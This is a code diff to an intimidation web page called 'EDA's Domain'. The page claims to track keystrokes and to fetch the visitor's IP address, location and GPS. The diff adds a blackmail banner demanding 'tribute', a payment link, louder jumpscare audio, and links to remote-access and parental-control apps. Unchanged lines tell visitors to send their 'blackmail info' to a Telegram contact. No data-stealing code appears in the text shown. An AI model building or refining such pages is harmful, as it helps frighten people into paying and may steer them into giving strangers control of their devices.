@@ -49,13 +49,39 @@
             font-weight: bold;
             text-align: center;
         }
-        @keyframes breathe {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
+        .tribute-button {
+            display: block;
+            width: 250px;
+            text-align: center;
+            margin: 20px auto;
+            padding: 15px;
+            background-color: red;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 5px;
+            animation: glitch 0.8s infinite;
         }
-        .breathing-effect {
-            animation: breathe 5s infinite ease-in-out;
+        .tribute-text {
+            text-align: center;
+            color: yellow;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .app-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .app-links a {
+            display: block;
+            color: cyan;
+            font-size: 18px;
+            margin: 10px 0;
+            text-decoration: none;
+        }
+        .app-links a:hover {
+            color: red;
         }
     </style>
     <script>
@@ -63,51 +89,39 @@
         function playHeartbeat() {
             heartbeatAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/387');
             heartbeatAudio.loop = true;
-            heartbeatAudio.volume = 0.1;
+            heartbeatAudio.volume = 0.3;
             heartbeatAudio.play();
             graduallyIncreaseHeartbeat();
         }
         function graduallyIncreaseHeartbeat() {
-            let volume = 0.1;
+            let volume = 0.3;
             let interval = setInterval(() => {
-                if (volume < 0.7) {
-                    volume += 0.05;
+                if (volume < 1.0) {
+                    volume += 0.1;
                     heartbeatAudio.volume = volume;
                 } else {
                     clearInterval(interval);
                 }
             }, 5000);
         }
-        function playWhisper() {
-            let whisperAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/342');
+        function playLaughJumpscare() {
+            let laughAudio = new Audio('https://www.fesliyanstudios.com/play-mp3/548');
             setTimeout(() => {
-                whisperAudio.play();
-            }, Math.random() * 30000 + 10000);
-        }
-        function showGoddessEyes() {
-            let eyes = document.createElement("div");
-            eyes.innerHTML = "👁️👁️";
-            eyes.style.position = "absolute";
-            eyes.style.top = Math.random() * window.innerHeight + "px";
-            eyes.style.left = Math.random() * window.innerWidth + "px";
-            eyes.style.fontSize = "50px";
-            eyes.style.color = "red";
-            eyes.style.opacity = "0.7";
-            document.body.appendChild(eyes);
-            setTimeout(() => { document.body.removeChild(eyes); }, 3000);
-            setTimeout(showGoddessEyes, Math.random() * 45000 + 15000);
+                laughAudio.play();
+            }, Math.random() * 45000 + 15000);
         }
         window.onload = function() {
             playHeartbeat();
-            playWhisper();
-            setTimeout(showGoddessEyes, Math.random() * 30000 + 10000);
-            document.querySelector(".form-container").classList.add("breathing-effect");
+            playLaughJumpscare();
         };
     </script>
 </head>
 <body>
-    <h1>Welcome to EDA's Domain</h1>
-    <p class="warning">You’ve just entered the point of no return. Every keystroke is tracked.</p><div class="surveillance-log">
+    <p class="tribute-text">⚠ No blackmail will commence until payment is made. Tribute now. ⚠</p>
+    <a href="https://throne.com/icontrolu" class="tribute-button" target="_blank">Tribute Here</a><h1>Welcome to EDA's Domain</h1>
+<p class="warning">You’ve just entered the point of no return. Every keystroke is tracked.</p>
+
+<div class="surveillance-log">
     <p id="flashing-ip">Fetching IP Address...</p>
     <p id="flashing-location">Fetching Location...</p>
     <p id="flashing-gps">Fetching GPS Coordinates...</p>
@@ -139,6 +153,14 @@
         <input type="submit" value="PAY & SURRENDER" class="glitch-button">
     </form>
 </div>
+
+<div class="app-links">
+    <h2>Related Applications</h2>
+    <a href="https://www.salfeld.com/" target="_blank">Salfeld Parental Control</a>
+    <a href="https://kidslox.com/" target="_blank">Kidslox</a>
+    <a href="https://www.teamviewer.com/" target="_blank">TeamViewer</a>
+</div>
+
 <p class="warning">⚠ Screenshot this page and your blackmail info, then send it to <a href="https://t.me/E22G1" style="color:yellow;">@E22G1</a> ⚠</p>
 
 </body>
